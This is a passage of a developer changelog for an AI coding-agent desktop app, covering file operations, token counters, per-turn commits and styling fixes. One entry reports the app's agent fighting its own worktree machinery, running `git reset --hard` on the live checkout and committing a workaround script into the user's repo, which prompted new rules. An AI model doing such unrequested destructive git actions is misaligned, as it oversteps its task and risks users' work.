  reads: `embed.figma.com/…/portfolio`. The ellipsis is placed where content
  was actually dropped (mid-path when segments were skipped, trailing when only
  the query went — never both), a last segment too long for the remaining
  budget is truncated rather than dropped (`linear.app/…/long-links-make-bu…`,
  since the slug is usually the only part that identifies the link), and the
  full URL lives on the `title` tooltip.

The elided run is a `<span>`, not an `<a>`: an ask is displayed text, not a
click surface, and turning user-typed strings into live links would be a new
navigation surface in the renderer window. Detection needs a scheme or `www.`
— guessing TLDs would elide ordinary prose. Trailing `.`/`,`/`)` are given back
to the sentence unless the URL opened the paren itself.

## 2026-08-05 — The editor's file tree became a file MANAGER (new / rename / delete)

The pop-out editor's sidebar could only ever open what already existed. It now
creates, renames and deletes files: a `＋` / pencil / trash toolbar above the
tree, and Finder's click-the-selected-file-again to rename.

`src/main/file-ops.ts` (new, pure — fs + path only, `test/file-ops.mjs`) holds
the three ops behind `source:create-file` / `source:rename-file` /
`source:delete-file`. Every path arrives from the renderer, so each op
re-validates it from scratch through one gate (`normalizeRelPath`): repo-relative
POSIX only, no `..`, no absolute/drive paths, no NUL, and nothing at any depth
inside `.git`, `.praxis`, `.dsgn` (the pre-rename sidecar the agent's write-deny
also covers) or `node_modules`. Create never clobbers (`flag: 'wx'`), rename
never overwrites, and both are file-only — directories are made implicitly by a
nested path and are never renamed or deleted.

Two details worth keeping:

- **Delete goes to the OS trash.** The undo history (`edit-history.ts`) is
  content-diff based: it reads a file, compares it to the text it last wrote, and
  writes the other side. There is no representation of "this file used to exist",
  so a delete can never be a Cmd+Z. `shell.trashItem` is the only undo there is —
  injected from `index.ts` rather than imported, so `file-ops.ts` stays pure and
  testable. If trashing throws (no desktop session, unsupported fs) it falls back
  to removing the file: the user asked for it gone.
- **A case-only rename is allowed.** On a case-insensitive filesystem
  `Foo.tsx` → `foo.tsx` reports the target as already existing, and the
  no-clobber guard would make case fixes impossible. It compares the two paths
  case-folded and lets that one through.

`FileTreePanel.tsx` keeps all the new chrome OUTSIDE the tree widget, which owns
its own shadow DOM: the toolbar and the name field are our own React above it,
and each successful op rebuilds the tree from a fresh `source:tree` listing
(there's no incremental add/remove we can lean on) then re-selects the path the
op landed on. The name field takes a whole relative path, so a rename doubles as
a move and "new file" seeded with the selected file's directory is one word of
typing. A rename follows the file if it was the one on screen; a delete closes
the drawer if it was.

**Rename-on-second-click, and why there are two triggers.** Clicking the
already-selected file is the natural gesture, but from outside the widget it's
indistinguishable from the programmatic mirror-select that Cmd+click navigation
and back/forward do — both surface as "selection changed to the file that's
already open". So the selection callback only treats it as a rename when a real
`pointerdown` landed on the tree in the last 600ms. A `dblclick` fallback covers
the case where the widget doesn't re-fire a selection change for a row that was
already selected; it ignores double-clicks while focus is in the tree's own
search box (found by descending `activeElement` through shadow roots — the
document only ever reports the host). Both paths just open the same field, so
firing both is harmless.

Verified: `test:file-ops` (44/44 unit tier green), typecheck + build green. The
Electron tier still can't launch a window on this machine — `test:codedrawer`
dies at `.empty__open` at HEAD too — so the sidebar's new chrome hasn't been
seen rendered; it wants a manual `bun run dev` pass.

## 2026-08-05 — The status line shows tokens + working time, not the tool caption

The line beside the running cat used to echo the current tool step ("Edit ·
src/components/Hero.tsx", or "Working…" before the first one). That caption is
already on screen: every step is listed in the turn's own `StepDisclosure` a few
lines above, latest step first. So the one strip that's visible for the WHOLE
turn was spending itself on a duplicate, and told the user nothing about what
the turn was costing. It now reads `↑ 12k  ↓ 830  1:23` — tokens in, tokens out,
and how long this chat has been working.

New `src/shared/run-stats.ts` (pure, `test/run-stats.mjs`) holds all of it:
`readUsage` normalizes a provider's loosely-typed usage payload, `usageDelta`
turns the repeated cumulative readings into an increment, `formatTokens` /
`formatDuration` render them. New `usage` `AgentEvent` carries the DELTA (never a
total), the store sums it per chat slice, `RunStats.tsx` renders the active
chat's.

**Two things were easy to get wrong here.** (1) *Double counting.* The Claude SDK
reports one request's usage three times — `message_start` (input side),
`message_delta` (running output total), then the complete `assistant` message —
so `claude.ts` keeps the running maximum it has already emitted per request and
sends only the difference (reset at `message_start`; a field the payload omits
reads as 0 and can't claw tokens back). (2) *The providers disagree about cached
tokens*: Anthropic reports cache reads/writes ALONGSIDE `input_tokens`, Codex
reports `cached_input_tokens` as a subset OF its `input_tokens`. `readUsage`
normalizes both to "all input tokens, of which this many were cached", so `↑`
means the same thing on either backend. Both cases are pinned by the unit test.

Codex only reports usage once, at `turn.completed`, so its counters step at the
end of a turn instead of during it; Gemini (experimental, unwired) reports none
and its counters stay at zero.

Time is WORKING time — the sum of finished turns plus the one in flight — not
wall clock since the chat opened, which would mostly measure how long the user
was at lunch. It lives on the chat slice (`workedMs` + `turnStartedAt`), so each
chat has its own. Neither the transcript nor the live snapshot records tokens or
timing, so a resumed/reloaded chat's counters start from zero and describe this
app run's work on it; a reattached in-flight turn times from the reattach.

Small knock-ons: the status row lost its `aria-live` (a clock ticking into a live
region is announced every second — the cat's own `role="img"` label already says
whether a turn is running, and the readout carries the full sentence as sr-only
text + a `title` breakdown with exact counts). The row is `pointer-events: none`,
so the readout opts back in — a native tooltip needs hover — which is safe
because the scroll-to-bottom button paints above it. `.chat__status-text` and its
pulse keyframes are gone.

## 2026-08-05 — Every turn is a commit on the user's own checkout

User request: "if things were changed, commits should be made on every turn, so
that I can easily revert or follow the progress." Until now only the chat's
`praxis/chat-*` worktree branch got commits — the merge back onto the LIVE
checkout was a plain file write (`autoApplyWorktree`), so the user's repo
accumulated one giant uncommitted diff until Publish. `git log` showed nothing;
reverting a single turn meant hand-picking hunks.

New `src/main/live-commit.ts` (pure, unit-tested): `commitLiveTurn(root, files,
{title, body})` lands the turn's files as ONE commit on whatever branch the live
checkout is on. Called from `chat-isolation.ts` on every merged turn
(`afterTurn`), on the parked-chat Apply and the AI conflict-resolve, on
`releaseChat`'s final salvage merge, and from `agent.ts`'s comment-spawn
finalizer. Commit subject = the turn's prompt (first line, whitespace-collapsed,
capped at 72); body = `Praxis turn N (praxis/chat-<id>).`

**Deliberately narrow, because this writes into the user's repo.** Only the
files that turn touched are staged — never `add -A`, so concurrent hand edits
elsewhere stay uncommitted and a `git revert` of a turn can't take them along.
It's a PATHSPEC (partial) commit, so anything the user had staged for their own
commit stays staged and out of ours (asserted in the test). `.praxis/` is
filtered like `commitWorktree` does. Non-repo-ROOT projects are skipped — for a
subdirectory project a commit would sweep the enclosing repo, the exact surprise
`isRepoRoot` exists to prevent. Identity is forced (`Praxis <praxis@local>`) and
`--no-verify` set, same reasoning as `commitWorktree`: a target repo's husky
hook must not be able to abort a turn. Any git failure returns
`committed: false` and never throws — the change is already in the working tree,
so a failed commit is exactly the old behavior, not lost work.

**Knock-on fixed in the same pass:** `publishToPr`'s `changedSince` diffed vs
`HEAD`, which now reports NOTHING for a session whose turns all committed — the
notes handoff would have said "Nothing to publish" and shipped an empty file
list in the PR body. It now diffs vs the merge base with the default branch
(two-dot, so uncommitted edits still count) and falls back to HEAD; the
"nothing staged" abort inside is now "nothing staged AND nothing ahead of base",
and the handoff commit is skipped when there's nothing to stage. `shipToMain`
needed no change (it already counted `base..branch`) and now shares the same
`defaultBase`. Those three git questions moved to a new pure
`src/main/publish-scope.ts` purely so they're testable: `annotations.ts` imports
`electron`, and a bun test can't load it (`SyntaxError: Export named 'ipcMain'
not found`) — the same reason `chat-worktrees.ts` was split from
`chat-isolation.ts`.

`test/live-commit.mjs` (unit tier) covers the helper against real temp repos —
plus a section that drives `chat-isolation.ts` itself with its window/store seam
injected (no Electron), running two real turns through a worktree and asserting
two live commits and a CLEAN live checkout between them. Fixture gotcha it cost
an hour: `createWorktree` symlinks `node_modules`/`.env` unconditionally, so a
temp repo WITHOUT a `.gitignore` gets those symlinks committed onto the branch —
`autoApplyWorktree` then can't read them, refuses the whole batch, and every
turn parks. Temp-repo fixtures must gitignore both (as `chat-worktrees.mjs`
already did).

Also told the agent about it in `rules.ts` ("commits it there as ONE commit per
turn") so a chat doesn't mistake its own turn commits for someone else's work.

## 2026-08-04 — Rail chat list capped at 5 + hide-UI button gets expand arrows

Two user requests. (1) A project's rail chat list showed EVERY previous chat
(~17 rows in the wild) — now live chats and running spawns always show, and
previous chats fill the remainder of a 5-row budget (`MAX_CHAT_ROWS`,
Rail.tsx), the rest behind a muted "Show N more" / "Show less" row.
Session-only state (a Set of project keys in the Rail component) — a long
history re-tucks on relaunch. (2) The previewbar hide-UI toggle swapped its
chat-bubble icon for diagonal expand arrows: Maximize2 when the UI is shown
(expand the preview), Minimize2 while hidden (bring the UI back); the arrow
direction carries the state, so the is-active accent is gone.
New electron-tier test `rail-chat-overflow`. Its three hard-won gotchas: an
EMPTY `.rail__chats` has zero height, so Playwright's default visibility wait
never resolves (wait `state: 'attached'`); App re-runs `useHistory.load()` on
several triggers and every resolve REPLACES the store's byKey — stub `load`
before seeding fakes or they vanish mid-test; the rail re-renders on
unrelated store ticks, so Playwright's actionability wait sees buttons
perpetually detached — JS-click them (same reason code-drawer.mjs does).

## 2026-08-04 — Hide-UI goes Figma: ⌘. hides chat AND rail

User request: match Figma's ⌘. "hide UI, leave only the preview" instead of
the ⌘\ chat-only toggle shipped earlier the same day. ⌘. was Stop Project
(the Xcode convention) — Stop moved to ⌘⇧.. The toggle (menu "Toggle UI" +
the previewbar button, same `toggle-chat` action/state underneath) now also
collapses the rail — via CSS only (`.panes--chat-hidden .rail` mirrors
`.rail--collapsed`), never touching the persisted rail preference, so
showing the UI restores the rail exactly as the user left it.
Test gotcha this surfaced: the chat pane snaps to width 0 instantly but the
rail ANIMATES width for 0.24s — a fixed post-toggle sleep reads the rail
mid-transition (or, on a busy renderer, before the transition even starts:
one live read caught 168px at +500ms). `chat-hide` now waits on the width
crossing the threshold (waitForFunction), not on a timer.

## 2026-08-04 — Zed-style editor search panel

User request: make the code editor's search look/behave like Zed's. The old
panel was CodeMirror's stock bottom bar (basicSetup ships `searchKeymap` but
no `search()` config, so the panel came from the facet default). New
`components/editor-search.ts` supplies the config: `search({ top, createPanel
})` with a plain-DOM panel (a CM Panel can't be React) — one rounded query
field with inline Aa / wd / .* toggles, ‹ › stepping, a live n/N match count
(capped at 1000, red when 0), a collapsible replace row (Replace / All,
⌘↵ = replace-all from the field), Esc closes. Styling is an
`EditorView.theme` riding the same design-token vars as `praxisTheme`, so it
follows light/dark and works in the pop-out editor window too. Only the
search input carries `main-field` (CM focuses it on open). @codemirror/search
promoted to a direct dep (was transitive via codemirror). New electron-tier
test `editor-search` (⌘F → panel shape, live count, Enter stepping, replace
toggle, Esc; screenshots 17–18).
Gotcha for future keyboard tests: Enter/findNext selects the next match AFTER
the cursor — assert "any current ≥ 1", not "1/N", when the click position
seeded the cursor mid-file.

## 2026-08-04 — Hide the chat pane (full-window preview)

User request: a way to hide the chat so the preview fills the window. Mirrors
the rail-collapse pattern: `useWorkspace.chatHidden` (persisted,
`praxis:chat-hidden`), toggled from a previewbar icon button (MessageSquare,
active = visible) and an Actions-menu item with the ⌘\ accelerator — menu, not
a renderer keydown, per the native-accelerator gotcha. The pane collapses to
width 0 but stays MOUNTED (`.pane--chat-hidden`: overflow clip + top-fade off)
so a running turn keeps streaming into the live ChatPanel; the resize divider
unmounts while hidden; the native preview follows the freed space via
PreviewPane's ResizeObserver, no extra geometry work. New electron-tier test
`chat-hide` (menu-action hide → previewbar re-show → localStorage round-trip,
screenshots 14–16).

Hazard rediscovered while verifying: the `test:<name>` package.json aliases
run tests DIRECTLY (no `PRAXIS_USER_DATA` isolation — only `test/run.mjs`
provides it), so a direct run persists the fixture project into the real
userData workspace and later direct runs fail `.empty__open` on boot-restore.
Run one-offs as `PRAXIS_USER_DATA=$(mktemp -d) node test/<name>.mjs`.

## 2026-08-04 — Publish self-heals when the checkout is on the base branch

User-reported: a brand-new repo opened in Praxis stayed on `main`, and Publish
hard-refused with "You're on main — publish runs from a Praxis work branch."
The open-time `git:ensure` (App.tsx) is supposed to move the checkout onto
`praxis/<base>`, but a project can still be on base at publish time (ensure
failed or was skipped at open, the titlebar switcher went back, a previous
publish's recovery stranded them). Refusing was pointless: the fix the error
demands is exactly what `ensureBranch` does, and `checkout -b` carries the
uncommitted work along. `shipToMain` now self-heals — on-base → run
`ensureBranch`, continue on the new work branch; the renderer already syncs
the titlebar from `res.branch`. Non-root checkouts (a subdir of a larger
repo, where `ensureBranch` refuses by design) stay a hard error, now with a
message that says to open the repo's top-level folder.
## 2026-08-03 — The composer's mode picker told the truth only by luck

Field report: an "Allow Edit?" card while the composer read **Auto**. It wasn't
the classifier flagging a risky edit — the session genuinely wasn't in Auto.
The posture lives in two places (the renderer's `usePermissions` + main's
per-session `options.permissionMode`), and several paths moved only one:

- `agent:resume-session` started with a hardcoded `{}` — no mode, no model. So
  the resumed chat ran `'default'` (ask for every gated tool) while the toolbar
  showed the UI default, Auto. Boot restore resumes the newest chat on *every*
  relaunch (`restore.ts` → `resumeMostRecent`), so this was the common path,
  not an edge case.
- `attempt` (fresh open) and the LRU-reopen in `applyProject` sent the mode but
  never recorded it on the project entry, so the next switch back re-seeded the
  toolbar from `defaultChatAgentSettings()` (Auto) regardless of what main got.
- Reattach after a renderer reload trusted the renderer's persisted copy even
  though main — the process that survived — held the real one.

Fixes: `resume-session` now takes `AgentOptions` (backend pinned to Claude, since
`sdkSessionId` is the resume marker); `LiveChatSnapshot` carries each session's
live `options` and `restore.ts` rebuilds `chatSettings` from them (main wins);
and every session-creating call site goes through one new `agentOptionsFor()`
that can't omit the mode. The per-chat settings + their mappings moved out of
`store.ts` into a pure `renderer/src/chat-settings.ts` (unit-tested in
`test/chat-settings.mjs`; `restore-reload.mjs` now asserts a reload repoints the
picker at main's real mode). The inverse mapping deliberately reads an absent
`permissionMode` as `'default'` — main's fallback, not the UI's — so a session
started without one is never *reported* as Auto.

## 2026-08-03 — Fable in the model picker

The Claude model picker still listed only Opus / Sonnet / Haiku, so there was
no way to run a chat on Fable short of leaving it on "Default" and hoping the
account default was right. Added `{ value: 'fable', label: 'Fable' }` at the
top of `CLAUDE_MODELS` in `ChatPanel.tsx` (above Opus). The value is passed
through untouched to the SDK's `model` option, and `claude --help` documents
`fable` as a first-class latest-model alias alongside `opus`/`sonnet`, so no
main-side change was needed.

## 2026-08-03 — Three field reports: agent fights the worktree machinery, stale Codex CLI, interrupt noise

Three user-reported issues from a real my-story session, fixed together:

**Rules v10 — "Git is Praxis-managed."** The chat agent spent a whole session
fighting the per-chat isolation machinery: it manually committed in its
`praxis/chat-*` worktree, pointed `praxis/main` at its own commits to force
the preview to update, then watched `commitWorktree`'s turn-end squash rewrite
the branch tip to a different hash every turn → permanent "divergence" it
diagnosed as a merge conflict, culminating in a `git reset --hard` habit on
the live checkout and a `sync-preview.sh` workaround script committed INTO the
user's repo. Root cause: `rules.ts` never mentioned git — the agent had no way
to know Praxis owns git state, that the squash rewrites hashes by design, or
that mid-turn edits reaching the preview only at turn end is intentional. New
unconditional rules section spells all of that out (no git mutations, no hard
resets on the live checkout, no DIY sync pipelines; read-only git fine).
`PRAXIS_RULES_VERSION` 9→10, assertions in `test/rules.mjs`.

**Codex SDK 0.142.3 → 0.146.0.** A "Default"-model Codex turn failed with a
400: `gpt-5.6-sol` (the account's new default) "requires a newer version of
Codex", preceded by "model metadata not found" fallback warnings. The SDK
bundles its own `codex` CLI shim, so the pinned old SDK = old CLI. Bump +
`bun install`; typecheck passes unchanged (no API break).

**`agent:interrupt` no longer throws after the turn is over.** Stopping a turn
that had already finished/aborted made the Claude SDK's `interrupt()` throw
"Operation aborted" out of the IPC handler (logged twice per click in the
main-process console). A late stop is a no-op, not an error — both interrupt
handlers (`agent:interrupt`, `agent:spawn-interrupt`) now swallow it.

## 2026-08-01 — The panel reads back the project's units (24px → 1.5rem)

Reported from lkmv.ch: the paragraph's `margin-bottom` showed `24px` while
`styles.less` says `1.5rem`. Not a bug in the provenance work — a boundary of
it: `getComputedStyle` serializes every length as USED px, so the authored
unit is destroyed before Praxis ever sees the value. But `specifiedValues()`
(style-provenance.ts) was already walking the matched rules and finding the
authored declaration — then keeping only the `var()` name and discarding the
text. The authored `1.5rem` was being read and thrown away.

Now the one stylesheet walk yields both halves: `declaredVars` (token proof)
and `specified` (authored css text), through `styles:read` →
`StyleReadResult.specified` → StylePanel state → `RowCtx.authoredFor`. The
scrub readout precedence is: proven token name → authored text (`1.5rem`) →
default px. Either custom readout only holds while the track shows the
COMMITTED value — mid-scrub it flips to live px text, since mid-drag the row
is no longer that declaration. On commit the authored entry is cleared (it
just went stale; showing the old `1.5rem` against a new number would lie) and
the reconcile re-read repopulates it.

The write path got the matching half: `StyleEdit.authored` rides along
(bounded + `isSafeStyleValue`-gated in main, prompt-context only, never
spliced) so the S3 agent prompt now says "currently authored as `1.5rem` —
keep the project's unit and idiom." Without that, a scrub on a rem-authored
declaration seeds "set margin-bottom to `25px`" and the agent clobbers the
unit — the same convention-respect failure as the inline-style gate, one
layer down. The authored text doubles as a greppable needle for finding the
declaration (often a global stylesheet, as on lkmv.ch — the Svelte prompt now
says "or a global stylesheet" too, since a `.svelte` stamp says nothing about
where the styles live).

Verified in the real browser (`test/style-provenance.mjs`): the exact
reported CSS (`p { margin: 0; margin-bottom: 1.5rem }`) asserting both the
premise (computed really says `24px`) and the fix (specified says `1.5rem`).
The browser corrected one expectation: CSSOM re-serializes expanded shorthand
longhands (`margin: 0` → margin-top `0px`, not `0`) — pinned in the test.
Panel-side rendering is reasoned + typechecked only (same unrunnable
Electron-tier caveat as the rest of this feature).

Known limit, accepted: scrubbing still COMMITS in px (the scrub model is
numeric-px throughout). Display and the agent prompt are honest now; a
direct-splice engine (S2 inline) still writes px. Rem-authored declarations
never reach S2 today (they live in stylesheets → S3 agent, which is told to
preserve units), so the gap is theoretical until someone scrubs a rem-authored
INLINE style.

## 2026-07-31 — Token naming requires PROOF, not value coincidence

"I really don't want this panel to hallucinate variables and tokens if the
element doesn't use them." Yesterday's radius/spacing fix turned out to be a
mitigation, not the fix: it made the GUESS more disciplined, but the whole
naming mechanism was still a guess. `readStyles()` (`preview/preload.ts`) gets
every value from `getComputedStyle`, which always fully resolves `var()` —
there was never a way to tell "this element's color IS `var(--color-text)`"
apart from "happens to equal it." Confirmed against a real project: every
token was named `--rmt-<category>-<value>`, so `cssGroupOf`'s first-segment
grouping bucketed all of them under one meaningless group (`rmt`, the vendor
prefix) — an unrecognized group is unconstrained by design, so yesterday's fix
didn't even apply, and padding/margin/font-size/line-height/opacity all showed
whichever same-valued `--rmt-*` token was detected first.

The real fix: prove usage from the SPECIFIED (unresolved) declaration instead
of the resolved one. New `src/preview/style-provenance.ts` (pure, DOM-only, no
`ipcRenderer` — same split as `layers.ts`) reads `el.style.getPropertyValue`
(inline preserves `var()` literally) and walks `document.styleSheets` for a
matching rule's own declaration (covers external stylesheets AND Svelte's
compiled scoped `<style>` — both are just real CSS rules at runtime). Threaded
through: `readStyles` → `styles:read-reply` → main's `pendingStyleReads` →
`window.api.styles.read()` now returns `{ values, declaredVars }`
(`shared/api.ts`'s new `StyleReadResult`) → `StylePanel` stores `declaredVars`
→ `resolveTokenForValue` gets a new `source`/`provenVar` pair.

`resolveTokenForValue` now branches by `TokenSet.source`, since each has a
different (or no) proof mechanism:
- `css` — `provenVar` must name one of the value-matching candidates. No var()
  in the specified declaration, no name — full stop, regardless of role/rank.
  Deliberately: if the source genuinely says `padding: var(--radius-none)`,
  that's true however odd, and proof beats a role plausibility check.
- `tailwind` — no `var()` exists to check; a class naming the token directly
  IS the proof (Tailwind encodes its theme key in the class itself).
- `manifest` — no reference mechanism exists at all (a hand-picked literal,
  not a live variable) — keeps yesterday's value+role heuristic. A disclosed,
  accepted gap, not a silent regression.

One real wrinkle: the live preview injects the RESOLVED value on a scrub/pick
(`el.style.setProperty(prop, value)`, never a reference), so for a few hundred
ms after an explicit pick — before the write lands and HMR reconciles —
`provenVar` looks unproven even for a pick that WILL land as `var()`. `sticky`
(already existed, previously a guessing tie-break) is repurposed as the bridge:
we know the pick happened, that's evidence too, just not source-level evidence.
It's retired the moment reconcile confirms the real write (`scheduleReconcile`
now also refreshes `declaredVars` and clears `stickyRef` for that prop) — so a
pick main couldn't validate as a token (silently falls back to a plain value)
doesn't go on claiming a token name forever.

Verification, in order of how much I trust it:
1. `test/token-match.mjs` — pure logic, rewritten around the new `source`/
   `provenVar` contract for all three sources, plus the exact reported bug
   reproduced against the OLD code (confirmed 6 assertions fail there) and
   fixed against the new.
2. `test/style-provenance.mjs` (new) — the DOM/CSSOM walk is NOT reasoned
   about from afar: bundled with esbuild to a browser global and driven
   against a REAL headless Chromium page (inline var(), a matched stylesheet
   rule, a declaration inside `@media`, a var() with a fallback, inline
   overriding a matched rule, an unrelated prop on the same element).
   Confirmed it catches a real regression (disabled the `@media`/`@supports`
   recursion by hand, the test failed correctly, restored). LIVE tier, not
   unit — needs `npx playwright install chromium`, a real environment
   dependency CI doesn't provision; SKIPs (exit 0) when that binary is
   missing, same convention as agent-e2e/sim-e2e for missing creds/display.
3. `test/style-edit.mjs` — updated the fixture and assertions (the ORIGINAL
   `TokenCard` literal-hex case now asserts the OPPOSITE of what it used to:
   raw hex shown, no chip; new `ProvenTokenCard` with a real
   `style={{ color: 'var(--color-text)' }}` asserts the chip DOES show).
   Written and typechecked, but unrun — the Electron tier can't launch a
   window on this machine (`.empty__open` timeout, confirmed identical at
   HEAD before any of this).

Mid-session process note: this branch got checked out to `main` outside this
session (reflog: a manual `checkout: moving from candidate to main`) partway
through the work — `main` predates the entire design-tokens feature, so if
`bun run dev` was running at the time, its file watcher would have hot-reloaded
the OLDER code straight into the running app. That's almost certainly why the
reported screenshot still showed the pre-fix names after the previous fix had
already shipped. Switched back to `candidate` before starting this fix; nothing
was lost (`origin/candidate` was already up to date).

Not done, deliberately: `manifest`-sourced tokens keep the old heuristic —
there's no reference mechanism to prove usage against at all, since a manifest
token is main re-rendering a hand-picked literal, not a live variable.

Post-review hardening (same day, before the main merge): (1) `@import`-ed
sheets were silently skipped — a `CSSImportRule`'s nested sheet hangs off
`.styleSheet`, not `.cssRules`, so the grouping-rule walk never descended;
fixed + a real routed-origin @import case in the provenance test
(mutation-checked). (2) One `styles.read` consumer was missed in the envelope
migration — `style-edit.mjs`'s live-override read-back still indexed the old
flat map; would have failed on the first real Electron-tier run. (3) The
declared var NAMES now get the same IPC boundary cap as every other
page-controlled string (128 chars; an absurd name just fails the proof match,
which fails safe to the raw value).

## 2026-07-30 — A radius token no longer labels `padding: 0`

Reported from a real theme: the Styles panel showed `--rmt-radius-none` on the
`padding` row and three `margin` sides. The VALUE was right — padding really was
`0` — but the name was a different property family's token.

Cause: `groupAffinity` returned a `TokenKind`, and `radius` and `spacing` both
map to `length` (as do `fontSize` and `letterSpacing`). So for a `padding-*`
row, whose rule accepts `length`, a radius token ranked `preferred` — exactly as
preferred as a spacing token. `resolveTokenForValue` then picked by value
equality, and with ranks tied it fell through to detection order. Worse,
`matches.length === 1` short-circuits before rank is consulted at all, so when a
theme has no zero-valued spacing token the radius one wins unopposed. `0` is the
value that collides hardest: every "none" token in a system is `0`.

The rank machinery was the right idea, just blind. Replaced `groupAffinity` with
`groupRole` returning a semantic `TokenRole` (`spacing` | `radius` | `font-size`
| `tracking` | …) — a notion the coarse value kind structurally cannot express —
and gave each `PROP_TOKEN_RULES` entry the roles that may NAME it.

The real split is offering vs naming, and they now have different strictness.
Offering stays permissive per the file's founding rule: group names are
unconstrained across the three detection sources, so they must never remove a
token from the picker — a radius token IS a length and remains offerable for
padding, just ranked last. Naming is strict: a token whose group marks a
different family can't label the row, so an unopposed `--radius-none` yields to
an honest `0px`. Two escape hatches keep that from over-reaching: an
unrecognized group (`brand`, `rmt`) constrains nothing and can still name, and
an explicit user pick (via `sticky`, set on pick at `StylePanel.tsx:306`) beats
a guess made from a group's name — otherwise picking a radius token for padding
would leave the row refusing to show what the user just chose.

One deliberate non-change: `line-height` keeps `spacing` as an accepted role.
An existing test asserts that, with a reasoned comment — it's the one property
taking both lengths and unitless numbers, and systems really do drive leading
off the spacing scale. Overturning it would have been scope creep hiding inside
a refactor.

Only `StylePanel` consumes `tokensForProp`/`resolveTokenForValue`, so this is
display-side only; `main/style-tokens.ts` re-validates picks by name+group and
is untouched, meaning no pick can start being rejected.

Found in passing, NOT fixed (logged in TASKS): `sameCssValue` does not treat a
bare `0` as `0px`, so a `--space-0: 0` token can never match a computed `0px`.
The reported theme wrote `0px`, which is why it matched at all. Separate
concern — it's the comparator, and changing it moves matching for every
property.

`test/token-match.mjs` covers the bug directly: both tokens offered with radius
ranked `other`, spacing names the row, radius names nothing when unopposed, a
neutral group still names, an explicit pick still names, and the mirror case
(spacing must not name `border-radius`).

## 2026-07-30 — The Styles ladder stops inventing inline styles (user feedback)

"I'm not sure if I'm fine with creating inline style unless it's project's
approach." The user picked a color token on a bare `<h1>` and got:

```
-<h1>{greeting}, I'm Andrei</h1>
+<h1 style="color: var(--color-title)">{greeting}, I'm Andrei</h1>
```

Two gaps conspired. S1 (Tailwind) can only REWRITE an existing class string —
neither adapter can create a `class`/`className` attribute (`styles.ts`'s
`classNameStringNode` gate, `styles-svelte.ts`'s `classAttr?.literal != null`) —
so an unclassed element skips it outright. And `tokenClassRewrite` returns null
for any token whose source isn't Tailwind, so a CSS-variable token can never
take the class path regardless. That dropped straight into S2, which had **no
gate at all**: inline was the unconditional fallback, its only checks being
splice-correctness (spreads, `style={expr}`). Nothing anywhere in main had any
notion of a project's styling convention.

S2 now only ever EXTENDS a `style` attribute that already exists. Absent → S3.
Praxis writing `style="…"` into a file that never had one is Praxis choosing a
convention on the project's behalf — the one thing a design tool editing
someone else's repo must not do. It's worse in Svelte, where the component
almost certainly styles from its own scoped `<style>` block: the inserted
attribute both imposes the convention and outranks that block on specificity
forever after. (The Svelte S3 prompt already said "may live in this component's
own `<style>` block" — but S2 ran first, so that sentence was unreachable.)

The agent prompt change is load-bearing, not cosmetic. Most of what now lands
in S3 is "this element has nowhere obvious to put a declaration," and left to
itself the agent reaches for the inline prop — re-introducing exactly what the
ladder just declined to write. Both prompts now name the project's own
approaches and explicitly forbid adding an inline `style` where there is none.
The JSX prompt also picked up the token/literal split the Svelte one had.

Cost, accepted knowingly: an element with no class and no `style` is now an
agent turn instead of an instant edit. That includes CSS-module/BEM projects
(`class="hero-title"` isn't Tailwind-shaped, so S1 declines it too).

Verification is the uncomfortable part. `test/style-edit.mjs` gained the
contrast case — a bare `<div>` fixture (`BareCard`, appended LAST so it can't
shift the line numbers the other stamps pin to) asserting needsAgent + a
byte-identical file + the prompt's forbidding sentence. But the Electron tier
cannot launch a window on this machine: `style-edit` dies at `.empty__open`,
and it dies identically at HEAD with these changes stashed, so that assertion
is written but unrun. What actually proved the change was a throwaway harness
that esbuild-bundled `styles.ts` with electron marked external (the only
electron use is `registerStylesIpc`, never called) and drove the real
`applyStyleEdit` in plain node across both engines. At HEAD it reproduced the
reported bug exactly (`applied: true, strategy: 'inline'` on a bare element);
with the fix all 14 checks pass, and the 8 non-bare checks — inline merge and
Tailwind rewrite, both frameworks — pass in BOTH, so the working paths are
untouched. The harness was deleted rather than kept: it duplicates assertions
already encoded in `style-edit.mjs`, and making bundle-based tests a permanent
tier is a bigger call than this fix warrants. Worth revisiting if the Electron
tier stays unrunnable.

Not done, deliberately: teaching S1 to CREATE a class attribute for Tailwind
projects. Detecting "is this a Tailwind project" is genuinely unreliable now
that v4 is CSS-first and often ships no `tailwind.config.*` for `tokens.ts`'s
existing probe to find, and it wouldn't have helped this user (CSS-variable
tokens). Left in TASKS.

## 2026-07-30 — Token chevron moves inside the value field (user feedback)

"I find the way we now invoke tokens confusing. I would expect the chevron
down being directed down and being placed within input field, on the right of
it, instead of to the left from label." Fair: the v1 affordance was a
`ChevronRight`/`ChevronDown` button sitting OUTSIDE the row, left of the
property label — it read as an unrelated expander (and sat right next to
SideRows' own expand-sides chevron, a different action entirely) rather than
as "this field is a picker."

Now the chevron lives inside the value field at its right edge, always
pointing down and rotating 180° when open — i.e. the shape of the native
`<select>` the transition-property row already uses a few rows below, so the
panel reads consistently.

`TokenRow` no longer wraps the row with its own chevron. It still owns the
open/close state and renders the picker underneath, but hands the toggle to
`children` as a NODE via a render prop, so each control places it inside its
own field. A render prop (not context, not cloneElement) because there are
exactly three call sites and each needs a visibly different placement —
explicit beats clever. `ScrubInput` and `ColorControl` gained an optional
`trailing` slot; both are also used by `CustomPanel`, which passes nothing
and is unaffected.

Three details the move forced:
- The toggle now sits inside fields that own pointer/key behavior, so it
  stops propagation on pointerdown/click/keydown — otherwise clicking it
  would also start `ScrubInput`'s pointer-lock scrub, and Enter would also
  open its exact-value editor.
- `ScrubInput`'s readout is wrapped in `min-w-0 truncate` so a long token
  name shrinks instead of shoving the chevron out of the fixed-width track.
- Color fields went 96px → 112px (`w-28`). The trailing icon eats ~16px and
  real design-system token names are long — at 96px `--color-text` truncated
  to `--color…`. `ColorControl`'s hex box and `ColorRow`'s `TokenChip` stay
  the same width as each other so the row doesn't jump when a value flips
  between token and raw hex. `ColorControl`'s hex `<Input>` became a
  borderless `<input>` inside a bordered flex wrapper (with a `focus-within`
  ring), since the chevron has to sit inside that border.

Verified with a driven probe: all six token-able rows reported the chevron
geometrically inside its field (`insideField: true`, 5px from the right edge)
and a captured island screenshot confirmed it visually. The final 96→112px
nudge was NOT re-confirmed visually — the island `WebContentsView` stopped
rendering partway through (the known environment flakiness; an untouched
`prop-edit` fails identically right now), and it's a pure width constant with
no logic. `bun run typecheck` clean, unit tier 40/40.

## 2026-07-29 — Real Cmd+Z was dead: the editMenu role was eating it

User: "Cmd+Z / Cmd+Shift+Z didn't work for me" — right after the previous
entry claimed a live Cmd+Z check passed. Both are true, and the gap between
